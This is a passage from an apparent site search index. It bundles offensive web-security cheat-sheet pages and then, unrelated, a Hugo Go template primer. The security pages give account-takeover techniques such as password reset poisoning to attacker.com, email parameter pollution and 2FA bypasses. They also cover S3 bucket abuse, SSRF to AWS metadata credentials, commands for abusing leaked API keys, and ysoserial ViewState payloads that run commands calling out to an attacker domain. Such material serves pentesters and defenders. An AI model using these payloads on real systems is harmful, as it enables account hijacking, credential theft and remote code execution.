twitter) Intercept the request in Burp Suite proxy Check if the referer header is leaking password reset token. Account Takeover Through Password Reset Poisoning # Intercept the password reset request in Burp Suite Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com Forward the request with the modified header POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN Password Reset Via Email Parameter # # parameter pollution email=victim@mail.com\u0026amp;email=hacker@mail.com # array of emails {\u0026#34;email\u0026#34;:[\u0026#34;victim@mail.com\u0026#34;,\u0026#34;hacker@mail.com\u0026#34;]} # carbon copy email=victim@mail.com%0A%0Dcc:hacker@mail.com email=victim@mail.com%0A%0Dbcc:hacker@mail.com # separator email=victim@mail.com,hacker@mail.com email=victim@mail.com%20hacker@mail.com email=victim@mail.com|hacker@mail.com IDOR on API Parameters # Attacker have to login with their account and go to the Change password feature. Start the Burp Suite and Intercept the request Send it to the repeater tab and edit the parameters : User ID/email POST /api/changepass [...] (\u0026#34;form\u0026#34;: {\u0026#34;email\u0026#34;:\u0026#34;victim@email.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;securepwd\u0026#34;}) Weak Password Reset Token # The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it\u0026rsquo;s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.\nTimestamp UserID Email of User Firstname and Lastname Date of Birth Cryptography Number only Small token sequence (\u0026lt;6 characters between [A-Z,a-z,0-9]) Token reuse Token expiration date Leaking Password Reset Token # Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com Inspect the server response and check for resetToken Then use the token in an URL like https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]\u0026amp;email=[THE_MAIL] Password Reset Via Username Collision # Register on the system with a username identical to the victim\u0026rsquo;s username, but with white spaces inserted before and/or after the username. e.g: \u0026quot;admin \u0026quot; Request a password reset with your malicious username. Use the token sent to your email and reset the victim password. Connect to the victim account with the new password. The platform CTFd was vulnerable to this attack. See: CVE-2020-7245\nAccount takeover due to unicode normalization issue # Victim account: demo@gmail.com Attacker account: demⓞ@gmail.com Account Takeover Via Cross Site Scripting # Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : *.domain.com Leak the current sessions cookie Authenticate as the user using the cookie Account Takeover Via HTTP Request Smuggling # Refer to HTTP Request Smuggling vulnerability page.\nUse smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE) git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h Craft a request which will overwrite the POST / HTTP/1.1 with the following data: GET http://something.burpcollaborator.net HTTP/1.1 X: Final request could look like the following GET / HTTP/1.1 Transfer-Encoding: chunked Host: something.com User-Agent: Smuggler/v1.0 Content-Length: 83 0 GET http://something.burpcollaborator.net HTTP/1.1 X: X Hackerone reports exploiting this bug\nhttps://hackerone.com/reports/737140 https://hackerone.com/reports/771666 Account Takeover via CSRF # Create a payload for the CSRF, e.g: \u0026ldquo;HTML form with auto submit for a password change\u0026rdquo; Send the payload Account Takeover via JWT # JSON Web Token might be used to authenticate an user.\nEdit the JWT with another User ID / Email Check for weak JWT signature 2FA Bypasses # Response Manipulation # In response if \u0026quot;success\u0026quot;:false Change it to \u0026quot;success\u0026quot;:true\nStatus Code Manipulation # If Status Code is 4xx Try to change it to 200 OK and see if it bypass restrictions\n2FA Code Leakage in Response # Check the response of the 2FA Code Triggering Request to see if the code is leaked.\nJS File Analysis # Rare but some JS Files may contain info about the 2FA Code, worth giving a shot\n2FA Code Reusability # Same code can be reused\nLack of Brute-Force Protection # Possible to brute-force any length 2FA Code\nMissing 2FA Code Integrity Validation # Code for any user acc can be used to bypass the 2FA\nCSRF on 2FA Disabling # No CSRF Protection on disabling 2FA, also there is no auth confirmation\nPassword Reset Disable 2FA # 2FA gets disabled on password change/email change\nBackup Code Abuse # Bypassing 2FA by abusing the Backup code feature Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions\nClickjacking on 2FA Disabling Page # Iframing the 2FA Disabling page and social engineering victim to disable the 2FA\nEnabling 2FA doesn\u0026rsquo;t expire Previously active Sessions # If the session is already hijacked and there is a session timeout vuln\nBypass 2FA with null or 000000 # Enter the code 000000 or null to bypass 2FA protection.\nBypass 2FA with array # { \u0026#34;otp\u0026#34;:[ \u0026#34;1234\u0026#34;, \u0026#34;1111\u0026#34;, \u0026#34;1337\u0026#34;, // GOOD OTP \u0026#34;2222\u0026#34;, \u0026#34;3333\u0026#34;, \u0026#34;4444\u0026#34;, \u0026#34;5555\u0026#34; ] } TODO # Broken cryptography Session hijacking OAuth misconfiguration References # 10 Password Reset Flaws - Anugrah SR $6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained Broken Cryptography \u0026amp; Account Takeovers - Harsh Bothra - September 20, 2020 Hacking Grindr Accounts with Copy and Paste - Troy HUNT \u0026amp; Wassime BOUIMADAGHENE - 03 OCTOBER 2020 CTFd Account Takeover "},{"id":11,"href":"/docs/amazon_aws_s3_buckets/","title":"Amazon AWS S3 Buckets","section":"Docs","content":" Amazon Bucket S3 AWS # AWS Configuration # Prerequisites, at least you need awscli\nsudo apt install awscli You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/\naws configure AWSAccessKeyId=[ENTER HERE YOUR KEY] AWSSecretKey=[ENTER HERE YOUR KEY] aws configure --profile nameofprofile then you can use \u0026ndash;profile nameofprofile in the aws command.\nAlternatively you can use environment variables instead of creating a profile.\nexport AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56 export AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU= Open Bucket # By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names\nhttp://s3.amazonaws.com/[bucket_name]/ http://[bucket_name].s3.amazonaws.com/ http://flaws.cloud.s3.amazonaws.com/ https://buckets.grayhatwarfare.com/ Their names are also listed if the listing is enabled.\n\u0026lt;ListBucketResult xmlns=\u0026#34;http://s3.amazonaws.com/doc/2006-03-01/\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;adobe-REDACTED-REDACTED-REDACTED\u0026lt;/Name\u0026gt; Alternatively you can extract the name of inside-site s3 bucket with %C0. (Trick from https://twitter.com/0xmdv/status/1065581916437585920)\nhttp://example.com/resources/id%C0 eg: http://redacted/avatar/123%C0 Basic tests # Listing files # aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 You can get the region with a dig and nslookup\n$ dig flaws.cloud ;; ANSWER SECTION: flaws.cloud. 5 IN A 52.218.192.11 $ nslookup 52.218.192.11 Non-authoritative answer: 11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com. Move a file into the bucket # aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers aws s3 mv test.txt s3://hackerone.marketing FAIL : \u0026#34;move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied.\u0026#34; aws s3 mv test.txt s3://hackerone.files SUCCESS : \u0026#34;move: ./test.txt to s3://hackerone.files/test.txt\u0026#34; Download every things # aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2 Check bucket disk size # Use --no-sign for un-authenticated check.\naws s3 ls s3://\u0026lt;bucketname\u0026gt; --recursive | grep -v -E \u0026#34;(Bucket: |Prefix: |LastWriteTime|^$|--)\u0026#34; | awk \u0026#39;BEGIN {total=0}{total+=$3}END{print total/1024/1024\u0026#34; MB\u0026#34;}\u0026#39; AWS - Extract Backup # $ aws --profile flaws sts get-caller-identity \u0026#34;Account\u0026#34;: \u0026#34;XXXX26262029\u0026#34;, $ aws --profile profile_name ec2 describe-snapshots $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2 \u0026#34;SnapshotId\u0026#34;: \u0026#34;snap-XXXX342abd1bdcb89\u0026#34;, Create a volume using snapshot $ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-XXXX342abd1bdcb89 In Aws Console -\u0026gt; EC2 -\u0026gt; New Ubuntu $ chmod 400 YOUR_KEY.pem $ ssh -i YOUR_KEY.pem ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com Mount the volume $ lsblk $ sudo file -s /dev/xvda1 $ sudo mount /dev/xvda1 /mnt Bucket juicy data # Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :\nhttp://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/\nReferences # There\u0026rsquo;s a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis Bug Bounty Survey - AWS Basic test flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route Guardzilla video camera hardcoded AWS credential - 0dayallday.org AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019 "},{"id":12,"href":"/docs/api_key_leaks/","title":"API Key Leaks","section":"Docs","content":" API Key Leaks # The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.\nTools # KeyFinder - is a tool that let you find keys while surfing the web! Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they\u0026rsquo;re valid. truffleHog - Find credentials all over the place docker run -it -v \u0026#34;$PWD:/pwd\u0026#34; trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys docker run -it -v \u0026#34;$PWD:/pwd\u0026#34; trufflesecurity/trufflehog:latest github --org=trufflesecurity trufflehog git https://github.com/trufflesecurity/trufflehog.git trufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2 Exploit # The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.\nGoogle Maps # Use : https://github.com/ozguralp/gmapsapiscanner/\nUsage:\nName Endpoint Static Maps https://maps.googleapis.com/maps/api/staticmap?center=45%2C10\u0026zoom=7\u0026size=400x400\u0026key=KEY_HERE Streetview https://maps.googleapis.com/maps/api/streetview?size=400x400\u0026location=40.720032,-73.988354\u0026fov=90\u0026heading=235\u0026pitch=10\u0026key=KEY_HERE Embed https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ\u0026key=KEY_HERE Directions https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland\u0026destination=Universal+Studios+Hollywood4\u0026key=KEY_HERE Geocoding https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30\u0026key=KEY_HERE Distance Matrix https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial\u0026origins=40.6655101,-73.89188969999998\u0026destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626\u0026key=KEY_HERE Find Place from Text https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia\u0026inputtype=textquery\u0026fields=photos,formatted_address,name,rating,opening_hours,geometry\u0026key=KEY_HERE Autocomplete https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh\u0026types=%28cities%29\u0026key=KEY_HERE Elevation https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034\u0026key=KEY_HERE Timezone https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510\u0026timestamp=1331161200\u0026key=KEY_HERE Roads https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795 Geolocate https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE Impact:\nConsuming the company\u0026rsquo;s monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account Algolia # curl --request PUT \\ --url https://\u0026lt;application-id\u0026gt;-1.algolianet.com/1/indexes/\u0026lt;example-index\u0026gt;/settings \\ --header \u0026#39;content-type: application/json\u0026#39; \\ --header \u0026#39;x-algolia-api-key: \u0026lt;example-key\u0026gt;\u0026#39; \\ --header \u0026#39;x-algolia-application-id: \u0026lt;example-application-id\u0026gt;\u0026#39; \\ --data \u0026#39;{\u0026#34;highlightPreTag\u0026#34;: \u0026#34;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#34;}\u0026#39; Slack API Token # curl -sX POST \u0026#34;https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE\u0026amp;pretty=1\u0026#34; Facebook Access Token # curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE\u0026amp;version=v3.2 Github client id and client secret # curl \u0026#39;https://api.github.com/users/whatever?client_id=xxxx\u0026amp;client_secret=yyyy\u0026#39; Twilio Account_sid and Auth token # curl -X GET \u0026#39;https://api.twilio.com/2010-04-01/Accounts.json\u0026#39; -u ACCOUNT_SID:AUTH_TOKEN Twitter API Secret # curl -u \u0026#39;API key:API secret key\u0026#39; --data \u0026#39;grant_type=client_credentials\u0026#39; \u0026#39;https://api.twitter.com/oauth2/token\u0026#39; Twitter Bearer Token # curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header \u0026#39;authorization: Bearer TOKEN\u0026#39; Gitlab Personal Access Token # curl \u0026#34;https://gitlab.example.com/api/v4/projects?private_token=\u0026lt;your_access_token\u0026gt;\u0026#34; HockeyApp API Token # curl -H \u0026#34;X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c\u0026#34; https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4 IIS Machine Keys # That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.\nRequirements\nmachineKey validationKey and decryptionKey __VIEWSTATEGENERATOR cookies __VIEWSTATE cookies Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.\n\u0026lt;machineKey validationKey=\u0026#34;87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\u0026#34; decryptionKey=\u0026#34;E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\u0026#34; validation=\u0026#34;SHA1\u0026#34; /\u0026gt; Common locations of web.config / machine.config\n32-bit C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config 64-bit C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config in registry when AutoGenerate is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab) HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4 HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey Identify known machine key # Exploit with Blacklist3r/AspDotNetWrapper Exploit with ViewGen # --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file # -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value $ viewgen --guess \u0026#34;/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\u0026#34; [+] ViewState is not encrypted [+] Signature algorithm: SHA1 # --encrypteddata : __VIEWSTATE parameter value of the target application # --modifier : __VIEWSTATEGENERATOR parameter value $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata \u0026lt;real viewstate value\u0026gt; --purpose=viewstate --modifier=\u0026lt;modifier value\u0026gt; –macdecode Decode ViewState # $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 \u0026#34;zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\u0026#34; $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=CA0B0334 --macdecode $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath \u0026#34;/Savings-and-Investments/Application/ContactDetails.aspx\u0026#34; -f out.txt --IISDirPath=\u0026#34;/\u0026#34; Generate ViewState for RCE # NOTE: Send a POST request with the generated ViewState to the same endpoint, in Burp you should URL Encode Key Characters for your payload.\n$ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \u0026#34;cmd.exe /c nslookup \u0026lt;your collab domain\u0026gt;\u0026#34; --decryptionalg=\u0026#34;AES\u0026#34; --generator=ABABABAB decryptionkey=\u0026#34;\u0026lt;decryption key\u0026gt;\u0026#34; --validationalg=\u0026#34;SHA1\u0026#34; --validationkey=\u0026#34;\u0026lt;validation key\u0026gt;\u0026#34; $ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \u0026#34;echo 123 \u0026gt; c:\\pwn.txt\u0026#34; --generator=\u0026#34;CA0B0334\u0026#34; --validationalg=\u0026#34;MD5\u0026#34; --validationkey=\u0026#34;b07b0f97365416288cf0247cffdf135d25f6be87\u0026#34; $ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \u0026#34;C:\\Users\\zhu\\Desktop\\ExploitClass.cs;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Web.dll\u0026#34; --generator=\u0026#34;CA0B0334\u0026#34; --validationalg=\u0026#34;SHA1\u0026#34; --validationkey=\u0026#34;b07b0f97365416288cf0247cffdf135d25f6be87\u0026#34; $ viewgen --webconfig web.config -m CA0B0334 -c \u0026#34;ping yourdomain.tld\u0026#34; Edit cookies with the machine key # If you have the machineKey but the viewstate is disabled.\nASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools\n# decrypt cookie $ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes # encrypt cookie (edit Decrypted.txt) $ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt Mapbox API Token # A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is sk, jackpot. If it\u0026rsquo;s pk or tk, it\u0026rsquo;s not worth your time.\n#Check token validity curl \u0026#34;https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN\u0026#34; #Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope) curl \u0026#34;https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN\u0026#34; References # Finding Hidden API Keys \u0026amp; How to use them - Sumit Jain - August 24, 2019 Private API key leakage due to lack of access control - yox - August 8, 2018 Project Blacklist3r - November 23, 2018 - @notsosecure Saying Goodbye to my Favorite 5 Minute P1 - Allyson O\u0026rsquo;Malley - January 6, 2020 Mapbox API Token Documentation "},{"id":13,"href":"/posts/goisforlovers/","title":"(Hu)go Template Primer","section":"Blog","content":"Hugo uses the excellent Go html/template library for its template engine. It is an extremely lightweight engine that provides a very small amount of logic. In our experience that it is just the right amount of logic to be able to create a good static website. If you have used other template systems from different languages or frameworks you will find a lot of similarities in Go templates.\nThis document is a brief primer on using Go templates. The Go docs provide more details.\nIntroduction to Go Templates # Go templates provide an extremely simple template language. It adheres to the belief that only the most basic of logic belongs in the template or view layer. One consequence of this simplicity is that Go templates parse very quickly.\nA unique characteristic of Go templates is they are content aware. Variables and content will be sanitized depending on the context of where they are used. More details can be found in the Go docs.\nBasic Syntax # Golang templates are HTML files with the addition of variables and functions.\nGo variables and functions are accessible within {{ }}\nAccessing a predefined variable \u0026ldquo;foo\u0026rdquo;:\n{{ foo }} Parameters are separated using spaces\nCalling the add function with input of 1, 2:\n{{ add 1 2 }} Methods and fields are accessed via dot notation\nAccessing the Page Parameter \u0026ldquo;bar\u0026rdquo;\n{{ .Params.bar }} Parentheses can be used to group items together\n{{ if or (isset .Params \u0026quot;alt\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;) }} Caption {{ end }} Variables # Each Go template has a struct (object) made available to it. In hugo each template is passed either a page or a node struct depending on which type of page you are rendering. More details are available on the variables page.\nA variable is accessed by referencing the variable name.\n\u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; Variables can also be defined and referenced.\n{{ $address := \u0026quot;123 Main St.\u0026quot;}} {{ $address }} Functions # Go template ship with a few functions which provide basic functionality. The Go template system also provides a mechanism for applications to extend the available functions with their own. Hugo template functions provide some additional functionality we believe are useful for building websites. Functions are called by using their name followed by the required parameters separated by spaces. Template functions cannot be added without recompiling hugo.\nExample:\n{{ add 1 2 }} Includes # When including another template you will pass to it the data it will be able to access. To pass along the current context please remember to include a trailing dot. The templates location will always be starting at the /layout/ directory within Hugo.\nExample:\n{{ template \u0026quot;chrome/header.html\u0026quot; . }} Logic # Go templates provide the most basic iteration and conditional logic.\nIteration # Just like in Go, the Go templates make heavy use of range to iterate over a map, array or slice. The following are different examples of how to use range.\nExample 1: Using Context\n{{ range array }} {{ . }} {{ end }} Example 2: Declaring value variable name\n{{range $element := array}} {{ $element }} {{ end }} Example 2: Declaring key and value variable name\n{{range $index, $element := array}} {{ $index }} {{ $element }} {{ end }} Conditionals # If, else, with, or, \u0026amp; and provide the framework for handling conditional logic in Go Templates. Like range, each statement is closed with end.\nGo Templates treat the following values as false:\nfalse 0 any array, slice, map, or string of length zero Example 1: If\n{{ if isset .Params \u0026quot;title\u0026quot; }}\u0026lt;h4\u0026gt;{{ index .Params \u0026quot;title\u0026quot; }}\u0026lt;/h4\u0026gt;{{ end }} Example 2: If -\u0026gt; Else\n{{ if isset .Params \u0026quot;alt\u0026quot; }} {{ index .Params \u0026quot;alt\u0026quot; }} {{else}} {{ index .Params \u0026quot;caption\u0026quot; }} {{ end }} Example 3: And \u0026amp; Or\n{{ if and (or (isset .Params \u0026quot;title\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;)) (isset .Params \u0026quot;attr\u0026quot;)}} Example 4: With\nAn alternative way of writing \u0026ldquo;if\u0026rdquo; and then referencing the same value is to use \u0026ldquo;with\u0026rdquo; instead. With rebinds the context . within its scope, and skips the block if the variable is absent.\nThe first example above could be simplified as:\n{{ with .Params.title }}\u0026lt;h4\u0026gt;{{ . }}\u0026lt;/h4\u0026gt;{{ end }} Example 5: If -\u0026gt; Else If\n{{ if isset .Params \u0026quot;alt\u0026quot; }} {{ index .Params \u0026quot;alt\u0026quot; }} {{ else if isset .Params \u0026quot;caption\u0026quot; }} {{ index .Params \u0026quot;caption\u0026quot; }} {{ end }} Pipes # One of the most powerful components of Go templates is the ability to stack actions one after another. This is done by using pipes. Borrowed from unix pipes, the concept is simple, each pipeline\u0026rsquo;s output becomes the input of the following pipe.\nBecause of the very simple syntax of Go templates, the pipe is essential to being able to chain together function calls. One limitation of the pipes is that they only can work with a single value and that value becomes the last parameter of the next pipeline.\nA few simple examples should help convey how to use the pipe.\nExample 1 :\n{{ if eq 1 1 }} Same {{ end }} is the same as\n{{ eq 1 1 | if }} Same {{ end }} It does look odd to place the if at the end, but it does provide a good illustration of how to use the pipes.\nExample 2 :\n{{ index .Params \u0026quot;disqus_url\u0026quot; | html }} Access the page parameter called \u0026ldquo;disqus_url\u0026rdquo; and escape the HTML.\nExample 3 :\n{{ if or (or (isset .Params \u0026quot;title\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;)) (isset .Params \u0026quot;attr\u0026quot;)}} Stuff Here {{ end }} Could be rewritten as\n{{ isset .Params \u0026quot;caption\u0026quot; | or isset .Params \u0026quot;title\u0026quot; | or isset .Params \u0026quot;attr\u0026quot; | if }} Stuff Here {{ end }} Context (aka. the dot) # The most easily overlooked concept to understand about Go templates is that {{ . }} always refers to the current context. In the top level of your template this will be the data set made available to it. Inside of a iteration it will have the value of the current item. When inside of a loop the context has changed. . will no longer refer to the data available to the entire page. If you need to access this from within the loop you will likely want to set it to a variable instead of depending on the context.\nExample:\n{{ $title := .Site.Title }} {{ range .Params.tags }} \u0026lt;li\u0026gt; \u0026lt;a href=\u0026quot;{{ $baseurl }}/tags/{{ . | urlize }}\u0026quot;\u0026gt;{{ . }}\u0026lt;/a\u0026gt; - {{ $title }} \u0026lt;/li\u0026gt; {{ end }} Notice how once we have entered the loop the value of {{ . }} has changed. We have defined a variable outside of the loop so we have access to it from within the loop.\nHugo Parameters # Hugo provides the option of passing values to the template language through the site configuration (for sitewide values), or through the meta data of each specific piece of content. You can define any values of any type (supported by your front matter/config format) and use them however you want to inside of your templates.\nUsing Content (page) Parameters # In each piece of content you can provide variables to be used by the templates. This happens in the front matter.\nAn example of this is used in this documentation site. Most of the pages benefit from having the table of contents provided. Sometimes the TOC just doesn\u0026rsquo;t make a lot of sense. We\u0026rsquo;ve defined a variable in our front matter of some pages to turn off the TOC from being displayed.\nHere is the example front matter:\n--- title: \u0026#34;Permalinks\u0026#34; date: \u0026#34;2013-11-18\u0026#34; aliases: - \u0026#34;/doc/permalinks/\u0026#34; groups: [\u0026#34;extras\u0026#34;] groups_weight: 30 notoc: true --- Here is the corresponding code inside of the template:\n{{ if not .Params.notoc }} \u0026lt;div id=\u0026quot;toc\u0026quot; class=\u0026quot;well col-md-4 col-sm-6\u0026quot;\u0026gt; {{ .TableOfContents }} \u0026lt;/div\u0026gt; {{ end }} Using Site (config) Parameters # In your top-level configuration file (eg, config.yaml) you can define site parameters, which are values which will be available to you in chrome.\nFor instance, you might declare:\nparams: CopyrightHTML: \u0026#34;Copyright \u0026amp;#xA9; 2013 John Doe. All Rights Reserved.\u0026#34; TwitterUser: \u0026#34;spf13\u0026#34; SidebarRecentLimit: 5 Within a footer layout, you might then declare a \u0026lt;footer\u0026gt; which is only provided if the CopyrightHTML parameter is provided, and if it is given, you would declare it to be HTML-safe, so that the HTML entity is not escaped again. This would let you easily update just your top-level config file each January 1st, instead of hunting through your templates.\n{{if .Site.Params.CopyrightHTML}}\u0026lt;footer\u0026gt; \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt;{{.Site.Params.CopyrightHTML | safeHtml}}\u0026lt;/div\u0026gt; \u0026lt;/footer\u0026gt;{{end}} An alternative way of writing the \u0026ldquo;if\u0026rdquo; and then referencing the same value is to use \u0026ldquo;with\u0026rdquo; instead. With rebinds the context . within its scope, and skips the block if the variable is absent:\n{{with .Site.Params.TwitterUser}}\u0026lt;span class=\u0026#34;twitter\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;https://twitter.com/{{.}}\u0026#34; rel=\u0026#34;author\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/images/twitter.png\u0026#34; width=\u0026#34;48\u0026#34; height=\u0026#34;48\u0026#34; title=\u0026#34;Twitter: {{.}}\u0026#34; alt=\u0026#34;Twitter\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/span\u0026gt;{{end}} Finally, if you want to pull \u0026ldquo;magic constants\u0026rdquo; out of your layouts, you can do so, such as in this example:\n\u0026lt;nav class=\u0026#34;recent\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Recent Posts\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt;{{range first .Site.Params.SidebarRecentLimit .Site.Recent}} \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;{{.RelPermalink}}\u0026#34;\u0026gt;{{.Title}}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; {{end}}\u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; 